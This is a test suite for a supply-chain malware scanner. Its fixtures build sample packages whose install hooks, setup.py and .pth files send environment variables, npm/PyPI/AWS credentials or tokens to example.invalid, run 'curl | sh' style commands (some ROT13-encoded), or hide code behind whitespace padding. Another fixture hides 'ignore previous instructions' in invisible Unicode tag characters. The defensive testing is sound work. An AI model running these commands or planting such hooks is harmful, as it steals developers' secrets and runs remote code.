"""Entry points (code that runs without anyone choosing to run it) and what they reach.

Each case is a small package modelled on a technique from public reports of malicious
packages: install hooks that read tokens and post them, `.pth` lines that run at every
Python start, loaders hidden after a long run of whitespace, and invisible characters.
Samples that antivirus products flag are ROT13-encoded here and decoded at run time
(see conftest.py); assertions compare rule IDs and paths only.
"""

from __future__ import annotations

import base64
import codecs
import json
from pathlib import Path

from bombsquad.model import Level
from bombsquad.sarif import to_sarif
from bombsquad.scan import scan


def rot(text: str) -> str:
    return codecs.decode(text, "rot13")


def build(root: Path, files: dict[str, str]) -> Path:
    for name, text in files.items():
        path = root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8", newline="\n")
    return root


def package(scripts: dict[str, str]) -> str:
    return json.dumps({"name": "demo", "version": "1.0.0", "scripts": scripts}, indent=2)


def ids_at(report, suffix: str) -> set[str]:
    return {f.rule.id for f in report.findings if f.path.endswith(suffix)}


def all_ids(report) -> set[str]:
    return {f.rule.id for f in report.findings}


# npm --------------------------------------------------------------------------------------

def test_preinstall_that_collects_and_posts_is_high(tmp_path):
    root = build(tmp_path, {
        "package.json": package({"preinstall": "node index.js", "test": "node test.js"}),
        "index.js": (
            "const https = require('https');\n"
            "const body = JSON.stringify(process.env);\n"
            "https.request({ hostname: 'example.invalid', method: 'POST' }).end(body);\n"
        ),
        "test.js": "require('https');\n",
    })
    report = scan([root])
    [entry] = report.entry_points
    assert entry.kind == "preinstall script"
    assert entry.targets and entry.targets[0].endswith("index.js")
    [ex] = [f for f in report.findings if f.rule.id == "BS-EX-001"]
    assert ex.path.endswith("package.json") and ex.level is Level.HIGH
    assert ex.region.line == entry.region.line
    assert ids_at(report, "index.js") == {"BS-NET-003", "BS-ENV-001"}
    assert ids_at(report, "test.js") == set()  # not an install hook


def test_relative_imports_are_followed(tmp_path):
    root = build(tmp_path, {
        "package.json": package({"postinstall": "node scripts/setup.js"}),
        "scripts/setup.js": (
            "const send = require('./lib/send');\n"
            "const fs = require('fs'), os = require('os'), path = require('path');\n"
            "send(fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8'));\n"
        ),
        "scripts/lib/send.js": (
            "import https from 'node:https';\n"
            "export default (b) => https.request('https://example.invalid').end(b);\n"
        ),
    })
    report = scan([root])
    assert "BS-EX-001" in ids_at(report, "package.json")
    assert ids_at(report, "setup.js") == {"BS-CR-001"}
    assert ids_at(report, "send.js") == {"BS-NET-003"}
    [net] = [f for f in report.findings if f.path.endswith("send.js")]
    assert "postinstall script" in net.via[0]


def test_curl_piped_to_shell_in_an_install_script(tmp_path):
    command = rot("phey -fFY uggcf://rknzcyr.vainyvq/v | fu")
    root = build(tmp_path, {"package.json": package({"install": command})})
    assert ids_at(scan([root]), "package.json") == {"BS-NET-002"}


def test_node_eval_inside_sh_c_is_analysed(tmp_path):
    command = "sh -c \"node -e 'require(\\\"https\\\").get(\\\"https://example.invalid\\\")'\""
    root = build(tmp_path, {"package.json": package({"postinstall": command})})
    report = scan([root])
    [net] = [f for f in report.findings if f.rule.id == "BS-NET-003"]
    assert net.path.endswith("package.json")
    assert any("node -e" in step for step in net.via)


def test_powershell_command_line_in_an_npm_script(tmp_path):
    root = build(tmp_path, {
        "package.json": package({"prepare": "pwsh -NoProfile -Command \"Remove-Item C:\\x\""}),
    })
    report = scan([root])
    [entry] = report.entry_points
    assert "git dependency" in entry.trigger
    assert ids_at(report, "package.json") == {"BS-FS-001"}


def test_binding_gyp_is_an_implicit_install_hook(tmp_path):
    expansion = rot("phey -f uggcf://rknzcyr.vainyvq/k | onfu")
    root = build(tmp_path, {
        "package.json": package({"test": "node test.js"}),
        "binding.gyp": "{'targets': [{'target_name': 'x', 'sources': ['<!(" + expansion
                       + ")']}]}\n",
    })
    report = scan([root])
    [entry] = report.entry_points
    assert entry.path.endswith("binding.gyp")
    assert ids_at(report, "binding.gyp") == {"BS-NET-002"}


def test_binding_gyp_with_an_install_script_is_not_doubled(tmp_path):
    root = build(tmp_path, {
        "package.json": package({"install": "node-gyp-build"}),
        "binding.gyp": "{'targets': []}\n",
    })
    assert [e.kind for e in scan([root]).entry_points] == ["install script"]


def test_prebuild_style_spawn_is_info_only(tmp_path):
    root = build(tmp_path, {
        "package.json": package({"install": "node install.js"}),
        "install.js": (
            "const { spawn } = require('child_process');\n"
            "spawn('node-gyp', ['rebuild'], { env: process.env, stdio: 'inherit' });\n"
        ),
    })
    report = scan([root])
    assert all_ids(report) == {"BS-PRC-001"}
    assert report.highest_level() is Level.INFO


def test_code_no_entry_point_reaches_is_not_analysed(tmp_path):
    root = build(tmp_path, {
        "package.json": package({"start": "node server.js"}),
        "server.js": "fetch('https://example.invalid', {headers: {a: process.env.GITHUB_TOKEN}})\n",
    })
    report = scan([root])
    assert report.entry_points == [] and report.findings == []


def test_targets_outside_the_package_are_not_followed(tmp_path):
    build(tmp_path, {"outside.js": "require('https')\n"})
    root = build(tmp_path / "pkg", {"package.json": package({"postinstall": "node ../outside.js"})})
    report = scan([root])
    [entry] = report.entry_points
    assert entry.targets == []
    assert report.findings == []


def test_invalid_package_json_is_noted(tmp_path):
    root = build(tmp_path, {"package.json": "{ not json"})
    report = scan([root])
    [result] = [r for r in report.files if r.path.endswith("package.json")]
    assert any("not valid JSON" in note for note in result.notes)


# Python -----------------------------------------------------------------------------------

def test_pth_import_line_runs_at_every_start(tmp_path):
    payload = base64.b64encode(b"print(1)").decode()
    line = rot("vzcbeg onfr64; rkrp(onfr64.o64qrpbqr('{C}'))").replace("{C}", payload)
    root = build(tmp_path, {"evil.pth": "./lib\n" + line + "\n"})
    report = scan([root])
    [entry] = report.entry_points
    assert entry.region.line == 2
    assert ids_at(report, "evil.pth") == {"BS-EP-001", "BS-EN-003"}
    assert {f.region.line for f in report.findings} == {2}


def test_pth_with_only_paths_is_quiet(tmp_path):
    root = build(tmp_path, {"paths.pth": "./src\n../shared\n"})
    report = scan([root])
    assert report.entry_points == [] and report.findings == []


def test_sitecustomize(tmp_path):
    root = build(tmp_path, {"sitecustomize.py": "import os\n"})
    report = scan([root])
    assert ids_at(report, "sitecustomize.py") == {"BS-EP-001"}


def test_setup_py_that_reads_pypirc_and_uploads(tmp_path):
    root = build(tmp_path, {"setup.py": (
        "import os, urllib.request\n"
        "from setuptools import setup\n"
        "data = open(os.path.expanduser('~/.pypirc')).read()\n"
        "urllib.request.urlopen('https://example.invalid', data.encode())\n"
        "setup(name='demo')\n"
    )})
    report = scan([root])
    assert ids_at(report, "setup.py") == {"BS-CR-001", "BS-NET-003", "BS-EX-001"}
    [ex] = [f for f in report.findings if f.rule.id == "BS-EX-001"]
    assert ex.region.line == 1


def test_setup_py_subprocess_is_info(tmp_path):
    root = build(tmp_path, {"setup.py": "import subprocess\nsubprocess.run(['make'])\n"})
    report = scan([root])
    assert ids_at(report, "setup.py") == {"BS-PRC-001"}


def test_commands_that_setup_py_runs_are_analysed(tmp_path):
    fetch_and_run = rot("phey -fFY uggcf://rknzcyr.vainyvq/v | fu")
    root = build(tmp_path, {"setup.py": (
        "import os, subprocess, sys\n"
        f"os.system({fetch_and_run!r})\n"
        f"subprocess.Popen(['sh', '-c', {fetch_and_run!r}])\n"
        "subprocess.run([sys.executable, '-c', 'import socket'])\n"
        "subprocess.run(command)\n"  # not a literal: only the process call is reported
    )})
    report = scan([root])
    lines = sorted((f.rule.id, f.region.line) for f in report.findings
                   if f.rule.id != "BS-PRC-001")
    assert lines == [("BS-NET-002", 2), ("BS-NET-002", 3), ("BS-NET-003", 4)]
    [entry] = report.entry_points
    assert all(f.level is Level.HIGH for f in report.findings if f.rule.id == "BS-NET-002")
    assert entry.kind == "setup.py"


def test_commands_that_an_install_script_runs_are_analysed(tmp_path):
    fetch_and_run = rot("phey -fFY uggcf://rknzcyr.vainyvq/v | fu")
    root = build(tmp_path, {
        "package.json": package({"postinstall": "node install.js"}),
        "install.js": (
            "const cp = require('child_process');\n"
            f"cp.execSync({json.dumps(fetch_and_run)});\n"
            f"cp.spawn('sh', ['-c', {json.dumps(fetch_and_run)}], {{stdio: 'inherit'}});\n"
            "cp.spawnSync('node', ['-e', \"require('net')\"]);\n"
            "cp.exec(command);\n"
        ),
    })
    report = scan([root])
    lines = sorted((f.rule.id, f.region.line) for f in report.findings
                   if f.path.endswith("install.js") and f.rule.id != "BS-PRC-001")
    assert lines == [("BS-NET-002", 2), ("BS-NET-002", 3), ("BS-NET-003", 4)]


def test_a_published_package_keeps_levels_only_for_what_installing_runs(tmp_path):
    exfiltrate = ("import os, urllib.request\n"
                  "urllib.request.urlopen('https://example.invalid', os.environ['NPM_TOKEN'])\n")
    root = build(tmp_path, {
        "setup.py": exfiltrate,
        "tests/conftest.py": exfiltrate,
        ".github/workflows/ci.yml": ("on: push\npermissions:\n  id-token: write\n"
                                     "jobs:\n  test:\n    runs-on: ubuntu-latest\n"
                                     "    steps:\n      - uses: example-org/setup-tool@v1\n"),
        "tools/clean.ps1": "Remove-Item C:\\x\n",
    })

    def levels(report, suffix):
        return {f.level for f in report.findings if f.path.endswith(suffix)}

    as_project = scan([root])
    as_package = scan([root], package=True)
    assert Level.HIGH in levels(as_project, "conftest.py")
    assert levels(as_project, "ci.yml") - {Level.INFO}
    assert levels(as_package, "conftest.py") == {Level.INFO}
    assert levels(as_package, "ci.yml") == {Level.INFO}
    assert levels(as_project, "clean.ps1") - {Level.INFO}
    assert levels(as_package, "clean.ps1") == {Level.INFO}
    assert {f.rule.id for f in as_package.findings if f.path.endswith("ci.yml")} >= {
        "BS-GHA-004", "BS-PIN-001"}
    assert levels(as_package, "setup.py") == levels(as_project, "setup.py")
    assert Level.HIGH in levels(as_package, "setup.py")
    [pinned] = [f for f in as_package.findings if f.path.endswith("ci.yml")
                and f.rule.id == "BS-PIN-001"]
    assert any("installing it does not run" in note for note in pinned.limitations)
    assert len(as_package.entry_points) == len(as_project.entry_points)


def test_a_prepare_script_does_not_run_when_a_published_package_is_installed(tmp_path):
    # npm runs `prepare` for a local or git install, not for a registry tarball, and the
    # first benchmark detonation saw none of 22 popular packages' prepare scripts run.
    steal = ("const https = require('https');\n"
             "https.request({ hostname: 'example.invalid', method: 'POST' })"
             ".end(JSON.stringify(process.env));\n")
    root = build(tmp_path, {"package.json": package({"prepare": "node build.js"}),
                            "build.js": steal})
    as_package = scan([root], package=True)
    assert [e.kind for e in as_package.entry_points] == ["prepare script"]
    assert {f.level for f in as_package.findings} == {Level.INFO}
    # A repository is installed locally or as a git dependency, where prepare does run.
    assert Level.HIGH in {f.level for f in scan([root]).findings}
    # An install hook in a published package keeps its level.
    build(tmp_path, {"package.json": package({"postinstall": "node build.js"})})
    assert Level.HIGH in {f.level for f in scan([root], package=True).findings}


def test_a_setup_py_below_the_project_root_does_not_run_from_a_package(tmp_path):
    # Like Ansible's ansible/modules/setup.py: a module that shares the name. pip runs only
    # the setup.py of the root it installs, and a wheel runs none below its root.
    module = ("import os, urllib.request\n"
              "urllib.request.urlopen('https://example.invalid', os.environ['NPM_TOKEN'])\n")
    root = build(tmp_path, {
        "sdist/pyproject.toml": "[build-system]\nrequires = ['setuptools']\n",
        "sdist/PKG-INFO": "Name: demo\n",
        "sdist/lib/demo/__init__.py": "",
        "sdist/lib/demo/modules/__init__.py": "",
        "sdist/lib/demo/modules/setup.py": module,
        "wheel/demo-1.0.dist-info/WHEEL": "Wheel-Version: 1.0\n",
        "wheel/demo/modules/setup.py": module,
    })

    def levels(report, suffix):
        return {f.level for f in report.findings if f.path.endswith(suffix)}

    as_package = scan([root], package=True)
    assert levels(as_package, "modules/setup.py") == {Level.INFO}
    assert {e.kind for e in as_package.entry_points} == {"setup.py below a project root"}
    # In a repository, a setup.py in a subfolder can be a project someone installs.
    assert Level.HIGH in levels(scan([root]), "modules/setup.py")


def test_a_package_cannot_hide_its_own_setup_py_with_project_files(tmp_path):
    # Project files and an __init__.py beside the real setup.py do not make it nested.
    exfiltrate = ("import os, urllib.request\n"
                  "urllib.request.urlopen('https://example.invalid', os.environ['NPM_TOKEN'])\n")
    root = build(tmp_path, {
        "setup.py": exfiltrate, "setup.cfg": "", "pyproject.toml": "", "PKG-INFO": "",
        "__init__.py": "", "demo-1.0.dist-info/WHEEL": "",
    })
    report = scan([root], package=True)
    assert Level.HIGH in {f.level for f in report.findings if f.path.endswith("setup.py")}
    assert [e.kind for e in report.entry_points] == ["setup.py"]


def test_setup_py_that_runs_its_own_version_file(tmp_path):
    root = build(tmp_path, {
        "setup.py": (
            "import os\n"
            "here = os.path.abspath(os.path.dirname(__file__))\n"
            "version = {}\n"
            "with open(os.path.join(here, 'demo', 'version.py')) as fp:\n"
            "    exec(fp.read(), version)\n"
            "path = os.path.join('demo', 'about.py')\n"
            "with open(path, 'rb') as f:\n"
            "    exec(compile(f.read(), path, 'exec'))\n"
            "exec(open(os.environ['X']).read())\n"  # not a known file: still reported
            "def compile(x):\n    return x\n"
            "compile(version)\n"  # the file's own compile, not the built-in
        ),
        "demo/version.py": "__version__ = '1.0'\n",
        "demo/about.py": "import socket\n",
    })
    report = scan([root])
    [entry] = report.entry_points
    assert sorted(t.rsplit("/", 1)[-1] for t in entry.targets) == [
        "about.py", "setup.py", "version.py"]
    assert [f.region.line for f in report.findings if f.rule.id == "BS-DE-006"] == [9]
    assert ids_at(report, "about.py") == {"BS-NET-003"}


def test_local_modules_that_setup_py_imports_are_followed(tmp_path):
    root = build(tmp_path, {
        "setup.py": "from setuptools import setup\nfrom demo.build import hook\nsetup()\n",
        "demo/__init__.py": "from . import version\n",
        "demo/version.py": "import os\nprint(dict(os.environ))\n",
        "demo/build.py": "import socket\n",
        "demo/unused.py": "import urllib.request\n",
    })
    report = scan([root])
    [entry] = report.entry_points
    assert sorted(t.rsplit("/", 1)[-1] for t in entry.targets) == [
        "__init__.py", "build.py", "setup.py", "version.py"]
    assert ids_at(report, "build.py") == {"BS-NET-003"}
    assert ids_at(report, "version.py") == {"BS-ENV-001"}
    assert ids_at(report, "unused.py") == set()


def test_copies_of_the_environment_count_only_when_serialised(tmp_path):
    root = build(tmp_path, {"setup.py": (
        "import json, os, subprocess\n"
        "env = os.environ.copy()\n"
        "subprocess.run(['make'], env=dict(os.environ, CC='gcc'))\n"
        "print(json.dumps(dict(os.environ)))\n"
        "print(str({**os.environ}))\n"
    )})
    report = scan([root])
    lines = sorted(f.region.line for f in report.findings if f.rule.id == "BS-ENV-001")
    assert lines == [4, 5]  # json.dumps and str; the copies on lines 2 and 3 are quiet


def env_lines(report, suffix: str) -> list[int]:
    return sorted(f.region.line for f in report.findings
                  if f.rule.id == "BS-ENV-001" and f.path.endswith(suffix))


def test_the_environment_held_in_a_value_and_sent_or_serialised(tmp_path):
    root = build(tmp_path, {
        "setup.py": (
            "import json, os, requests\n"
            "from os import environ\n"
            "requests.post('https://example.invalid', json={'env': dict(os.environ)})\n"
            "info = {'host': 'x', 'env': environ}\n"
            "body = json.dumps(info)\n"
        ),
        "package.json": package({"postinstall": "node index.js"}),
        "index.js": (
            "const axios = require('axios');\n"
            "JSON.stringify({ host: 'x', env: process.env });\n"
            "axios.post('https://example.invalid', { env: { ...process.env } });\n"
            "const info = { env: process.env };\n"
            "fetch('https://example.invalid', { method: 'POST', body: info });\n"
            "const copy = process.env;\n"
            "fetch('https://example.invalid', { body: [copy] });\n"
        ),
    })
    report = scan([root])
    assert env_lines(report, "setup.py") == [3, 5]
    assert env_lines(report, "index.js") == [2, 3, 5, 7]
    # The correlation is reported at each entry point: setup.py, and the npm hook.
    assert {"BS-EX-001"} <= ids_at(report, "setup.py") & ids_at(report, "package.json")


def test_the_environment_given_to_a_child_process_stays_quiet(tmp_path):
    root = build(tmp_path, {
        "setup.py": (
            "import os, subprocess, requests\n"
            "options = {'env': dict(os.environ, CC='gcc')}\n"
            "subprocess.run(['make'], **options)\n"
            "subprocess.run(['make'], env={**os.environ, 'CC': 'gcc'})\n"
            "requests.get('https://example.invalid', params={'v': os.environ.get('HOME')})\n"
        ),
        "package.json": package({"postinstall": "node build.js"}),
        "build.js": (
            "const { spawn } = require('child_process');\n"
            "const options = { env: { ...process.env, CC: 'gcc' }, stdio: 'inherit' };\n"
            "spawn('make', [], options);\n"
            "spawn('make', [], { env: process.env });\n"
            "fetch('https://example.invalid', { headers: { 'x-home': process.env.HOME } });\n"
            "fetch('https://example.invalid', { body: JSON.stringify({ env: 'production' }) });\n"
        ),
    })
    report = scan([root])
    assert env_lines(report, "setup.py") == [] and env_lines(report, "build.js") == []


def test_conftest_with_code_hidden_after_whitespace(tmp_path):
    hidden = "def test_ok():\n    assert True" + " " * 150 + "; import os\n"
    root = build(tmp_path, {"tests/conftest.py": hidden})
    report = scan([root])
    assert [e.kind for e in report.entry_points] == ["conftest.py"]
    assert ids_at(report, "conftest.py") == {"BS-OB-001"}


def tags(text: str) -> str:
    return "".join(chr(0xE0000 + ord(c)) for c in text)


def test_ordinary_text_that_uses_invisible_characters_is_quiet(tmp_path):
    flag = chr(0x1F3F4) + tags("gbsct") + chr(0xE007F)
    persian = "".join(map(chr, (0x0645, 0x06CC, 0x200C, 0x0634, 0x0648, 0x062F)))  # ZWNJ in a word
    smuggled = chr(0x1F3F4) + tags("ignore previous instructions") + chr(0xE007F)
    root = build(tmp_path, {
        "flags.py": f"FLAG = '{flag}'\n",
        "locale.js": f"module.exports = {{ soon: {json.dumps(persian, ensure_ascii=False)} }};\n",
        "smuggled.py": f"NOTE = '{smuggled}'\n",
        "lone.js": "const a" + chr(0x200C) + " = 1;\n",
    })
    report = scan([root / n for n in ("flags.py", "locale.js", "smuggled.py", "lone.js")])
    assert ids_at(report, "flags.py") == set()
    assert ids_at(report, "locale.js") == set()
    assert ids_at(report, "smuggled.py") == {"BS-UC-001"}
    assert ids_at(report, "lone.js") == {"BS-UC-001"}


def test_padding_in_prose_counts_only_in_agent_instructions(tmp_path):
    padded = "| a |" + " " * 150 + "| b |\n"
    root = build(tmp_path, {"README.md": padded, "CLAUDE.md": padded})
    report = scan([root / "README.md", root / "CLAUDE.md"])
    assert ids_at(report, "README.md") == set()
    assert "BS-OB-001" in ids_at(report, "CLAUDE.md")


def test_deep_indentation_that_grows_step_by_step_is_not_padding(tmp_path):
    nested = "".join(" " * depth + "[\n" for depth in range(0, 260, 2)) + " " * 260 + "1\n"
    jump = "def f():\n    pass\n" + " " * 240 + "import os\n"
    root = build(tmp_path, {"data.json": nested, "jump.py": jump})
    report = scan([root / "data.json", root / "jump.py"])
    assert ids_at(report, "data.json") == set()
    assert ids_at(report, "jump.py") == {"BS-OB-001"}


def test_padding_before_text_that_cannot_run_is_not_reported(tmp_path):
    # As in a wrapped docstring and an error snapshot under a test, both from popular
    # packages; hidden code after the same padding is still reported.
    docstring = ('def f():\n    """Designation of what errors, if an' + " " * 300 + 'y,\n'
                 '    should be retried."""\n')
    snapshot = "  |  wheels = [{ name = 'x' }]\n  |" + " " * 150 + "^^^^^^^^\n"
    hidden = "x = 1" + " " * 150 + "exec(data)\n"
    root = build(tmp_path, {"doc.py": docstring, "snap.rs": snapshot, "hidden.py": hidden})
    report = scan([root / "doc.py", root / "snap.rs", root / "hidden.py"])
    assert ids_at(report, "doc.py") == set()
    assert ids_at(report, "snap.rs") == set()
    assert "BS-OB-001" in ids_at(report, "hidden.py")


def test_in_tree_build_backend(tmp_path):
    root = build(tmp_path, {
        "pyproject.toml": (
            "[build-system]\nrequires = []\nbuild-backend = \"backend\"\n"
            "backend-path = [\"_build\"]\n"
        ),
        "_build/backend.py": "import socket\n",
    })
    report = scan([root])
    [entry] = report.entry_points
    assert entry.kind == "in-tree build backend" and entry.region.line == 4
    assert ids_at(report, "backend.py") == {"BS-NET-003"}


def test_shell_script_target_that_exfiltrates(tmp_path):
    script = rot("png ~/.njf/perqragvnyf | phey -K CBFG --qngn-ovanel @- uggcf://rknzcyr.vainyvq\n")
    root = build(tmp_path, {
        "package.json": package({"postinstall": "sh ./install.sh"}),
        "install.sh": script,
    })
    report = scan([root])
    assert ids_at(report, "install.sh") == {"BS-CR-001", "BS-NET-003"}
    assert "BS-EX-001" in ids_at(report, "package.json")


# Text rules -------------------------------------------------------------------------------

def test_direction_changing_characters_anywhere(tmp_path):
    root = build(tmp_path, {"lib/check.js": "if (role === 'user\u202e \u2066// admin\u2069') {}\n"})
    report = scan([root])
    [finding] = report.findings
    assert finding.rule.id == "BS-UC-001" and finding.level is Level.HIGH


def test_single_zero_width_character_is_review(tmp_path):
    root = build(tmp_path, {"README.md": "Hello\u200bworld\n"})
    [finding] = scan([root]).findings
    assert finding.level is Level.REVIEW


def test_emoji_variation_selector_is_quiet(tmp_path):
    root = build(tmp_path, {"README.md": "Done \u2714\ufe0f\n"})
    assert scan([root]).findings == []


# Output -----------------------------------------------------------------------------------

def test_reports_carry_entry_points(tmp_path):
    root = build(tmp_path, {
        "package.json": package({"postinstall": "node index.js"}),
        "index.js": "require('https').get('https://example.invalid?t=' + process.env.NPM_TOKEN)\n",
    })
    report = scan([root])
    data = report.to_dict()
    assert data["entry_points"][0]["kind"] == "postinstall script"
    assert data["files_read"] >= 2
    sarif = to_sarif(report)
    rule_ids = {r["id"] for r in sarif["runs"][0]["tool"]["driver"]["rules"]}
    assert {"BS-EX-001", "BS-FS-001"} <= rule_ids
    assert {r["ruleId"] for r in sarif["runs"][0]["results"]} == {
        "BS-EX-001", "BS-NET-003", "BS-CR-001"}


def test_hook_that_runs_another_script(tmp_path):
    root = build(tmp_path, {
        "package.json": package({"postinstall": "npm run setup --silent",
                                 "setup": "node setup.js", "start": "node server.js"}),
        "setup.js": "require('dns').resolveTxt(process.env.GITHUB_TOKEN + '.example.invalid')\n",
        "server.js": "require('https')\n",
    })
    report = scan([root])
    [entry] = report.entry_points
    assert [t.rsplit("/", 1)[-1] for t in entry.targets] == ["setup.js"]
    assert ids_at(report, "setup.js") == {"BS-NET-003", "BS-CR-001"}
    assert ids_at(report, "server.js") == set()
